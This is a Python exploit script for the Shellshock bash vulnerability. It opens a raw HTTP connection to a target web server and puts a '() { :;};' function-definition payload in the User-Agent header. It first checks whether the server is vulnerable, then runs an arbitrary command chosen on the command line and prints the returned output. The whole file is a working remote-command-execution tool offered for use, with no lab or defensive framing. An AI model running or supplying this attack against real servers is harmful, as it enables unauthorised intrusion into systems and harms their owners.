#!/usr/bin/env python3
import socket
import argparse
import logging
from typing import Dict
from urllib.parse import urlparse


class ShellshockExploit:
    def __init__(self):
        self.timeout = 5
        self.logger = logging.getLogger(__name__)

    def check_vulnerability(self, target: str) -> Dict:
        """Check if target is vulnerable to Shellshock."""
        try:
            # Parse target URL
            parsed = urlparse(
                target if target.startswith("http") else f"http://{target}"
            )
            host = parsed.hostname
            path = parsed.path or "/"

            # Create socket connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((host, 80))

            # Create HTTP request with Shellshock test
            headers = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                "User-Agent: () { :;}; echo vulnerable\r\n"
                "\r\n"
            )

            # Send request
            sock.send(headers.encode())

            # Receive response
            response = sock.recv(4096).decode()

            # Check if response contains "vulnerable"
            if "vulnerable" in response:
                return {
                    "vulnerable": True,
                    "details": "Target appears to be vulnerable to Shellshock",
                }

            return {
                "vulnerable": False,
                "details": "Target appears to be not vulnerable to Shellshock",
            }

        except Exception as e:
            self.logger.error(f"Error checking vulnerability: {str(e)}")
            return {"vulnerable": False, "error": str(e)}
        finally:
            try:
                sock.close()
            except:
                pass

    def exploit(self, target: str, command: str = "id") -> Dict:
        """Attempt to exploit Shellshock vulnerability."""
        try:
            # First check if vulnerable
            vuln_check = self.check_vulnerability(target)
            if not vuln_check.get("vulnerable", False):
                return {
                    "success": False,
                    "error": "Target is not vulnerable to Shellshock",
                }

            # Parse target URL
            parsed = urlparse(
                target if target.startswith("http") else f"http://{target}"
            )
            host = parsed.hostname
            path = parsed.path or "/"

            # Create socket connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((host, 80))

            # Create HTTP request with command injection
            headers = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: () {{ :;}}; {command}\r\n"
                "\r\n"
            )

            # Send request
            sock.send(headers.encode())

            # Receive response
            response = sock.recv(4096).decode()

            # Extract command output
            output = self._extract_command_output(response)

            return {"success": True, "command": command, "output": output}

        except Exception as e:
            self.logger.error(f"Error during exploit: {str(e)}")
            return {"success": False, "error": str(e)}
        finally:
            try:
                sock.close()
            except:
                pass

    def _extract_command_output(self, response: str) -> str:
        """Extract command output from HTTP response."""
        # This is a simplified version of output extraction
        # In a real implementation, this would parse the HTTP response more carefully
        try:
            # Try to find command output between headers and body
            body_start = response.find("\r\n\r\n") + 4
            return response[body_start:].strip()
        except:
            return "Could not extract command output"


def main():
    parser = argparse.ArgumentParser(description="Shellshock Exploit")
    parser.add_argument("--target", required=True, help="Target host")
    parser.add_argument("--check", action="store_true", help="Check for vulnerability")
    parser.add_argument("--command", default="id", help="Command to execute")
    args = parser.parse_args()

    exploit = ShellshockExploit()

    if args.check:
        result = exploit.check_vulnerability(args.target)
        print(f"Vulnerability check result: {result}")
    else:
        result = exploit.exploit(args.target, args.command)
        print(f"Exploit result: {result}")


if __name__ == "__main__":
    main()
